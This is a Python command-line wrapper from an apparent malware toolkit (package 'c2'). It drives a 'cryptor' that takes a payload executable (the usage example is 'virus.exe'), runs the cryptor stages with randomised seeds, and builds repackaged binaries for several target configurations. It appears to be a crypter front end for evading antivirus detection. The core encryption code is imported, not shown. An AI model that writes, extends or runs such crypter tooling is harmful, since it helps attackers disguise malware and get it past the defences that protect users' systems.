import os, sys, argparse, random, json

from c2.cryptor import CryptorFactory
from c2.infra.tool_cli import ToolCLI
from c2.infra.unischema import unischema_load
from c2.common.multi_stream_writer import MultiStreamWriter

# cryptor_cli.py -i virus.exe -o ./outdir --pay --crp --rnd --bld

_sd = os.path.dirname(__file__)


# After execute(), to obtain _BINPATHS_.json and _OUTDATA_.json, just read them from args.out_dir directory
class CryptorCLI(ToolCLI):
  def __init__(self, argv, cryptor_name='normal'):
    super().__init__(argv)
    self._crpfac = CryptorFactory(cryptor_name)
    self._cryptor = None
    #self._built_tups = []

  def _initialize(self): self._progname = os.path.basename(__file__)

  def _setup_args(self):
    inclroot = f'{_sd}'
    self._agr.add_config('pay', unischema_load(f'{_sd}/pay_info.UNISCHEMA', inclroot))
    self._agr.add_config('crp', unischema_load(f'{_sd}/crp_opts.UNISCHEMA', inclroot))
    self._agr.add_config('sys', unischema_load(f'{_sd}/sys_opts.UNISCHEMA', inclroot))
    self._agr.add_config('rnd', unischema_load(f'{_sd}/rnd_opts.UNISCHEMA', inclroot))
    # bld opts is CLI-only thing, not underlying Cryptor thing
    # cryptor doesn't need to know what to build cuz it gives you the build() function
    # but the CLI does, as well as Backend, which needs to known cfg|prj to build to do it as a single action
    self._agr.add_config('bld', unischema_load(f'{_sd}/bld_opts.UNISCHEMA', inclroot))

    self._parser.add_argument('-i', '--input_file', required=True)
    self._parser.add_argument('-o', '--out_dir', required=True)
    self._parser.add_argument('--solution_name', required=False)
    self._parser.add_argument('--log_file', required=False)
    self._parser.add_argument('--log_stdout', action='store_true')

  def _do_work(self):
    args, _agr = self._args, self._agr
    pay_info, crp_opts, sys_opts, rnd_opts, bld_opts = _agr.config('pay'), _agr.config('crp'), _agr.config('sys'), _agr.config('rnd'), _agr.config('bld')

    solution_name = args.solution_name
    if not solution_name:
      solution_name = os.path.basename(args.input_file)
      solution_name = solution_name.split('.')[0]
    seeds = rnd_opts['seeds']

    print(f'[ ] Solution name will be: {solution_name}\n[ ] Seeds: {len(seeds)} keys: {seeds.keys()}')

    log_file = args.log_file if args.log_file else f'{args.out_dir}/cryptor.log'
    with open(log_file, 'w') as f:

      multistm_writ = MultiStreamWriter([f])
      if self._args.log_stdout:
        multistm_writ.add_stream(sys.stdout)

      self._cryptor = self._crpfac.create_cryptor(
        args.input_file, pay_info, crp_opts, sys_opts, rnd_opts, args.out_dir, solution_name, multistm_writ)

      first = True

      print(f'[ ] Running all stages of cryptor')
      self._cryptor.all_stages(fn_prn=print)

      for target_config in bld_opts['target_configs'].split(','):
        for target_project in bld_opts['target_projects'].split(','):

          print(f'[ ] Building {target_config}|{target_project}')

          self._cryptor.build(target_config, target_project)

          #self._built_tups = (target_config, target_project)
          #self._update_binpaths_file()
          if first:
            # after building first project, place _BINPATHS_.json ONCE
            first = False
            json.dump(self._cryptor.get_out_bin_paths(),
                      open(f'{args.out_dir}/_BINPATHS_.json', 'w'))



if __name__ == '__main__':
  ccli = CryptorCLI(sys.argv[1:])
  ccli.execute()














